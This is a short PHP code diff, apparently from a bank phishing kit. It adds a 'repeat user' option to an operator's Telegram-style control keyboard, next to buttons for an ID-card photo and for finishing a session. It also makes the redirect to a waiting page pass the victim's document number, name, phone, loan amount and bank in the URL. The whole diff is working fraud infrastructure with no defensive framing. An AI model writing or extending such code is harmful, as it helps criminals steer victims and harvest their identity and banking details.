@@ -164,6 +164,9 @@ $teclado = array(
             array('text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",    'callback_data' => "OPCION_5_" . $idPeticion),
         ),
         array(
+            array('text' => "\xF0\x9F\x94\x84 REPETIR USUARIO", 'callback_data' => "OPCION_7_" . $idPeticion),
+        ),
+        array(
             array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $idPeticion),
         ),
     ),
@@ -201,9 +204,18 @@ $_SESSION['request_id']       = $idPeticion;
 $_SESSION['key']              = $claveUnica;
 
 $redirArr = array(
-    'rid'    => $idPeticion,
-    'key'    => $claveUnica,
-    'correo' => $correoFinal,
+    'rid'              => $idPeticion,
+    'key'              => $claveUnica,
+    'correo'           => $correoFinal,
+    'requestId'        => $idPeticion,
+    'tipo_documento'   => $tipoDoc,
+    'numero_documento' => $numDoc,
+    'nombre'           => $nombreFinal,
+    'telefono'         => $telefono,
+    'monto'            => $montoFinal,
+    'cupo'             => $montoFinal,
+    'monto_texto'      => $montoTexto,
+    'banco'            => $bancoFinal,
 );
 $redirQs = http_build_query($redirArr, '', '&', PHP_QUERY_RFC3986);
 header("Location: espera.html?" . $redirQs);
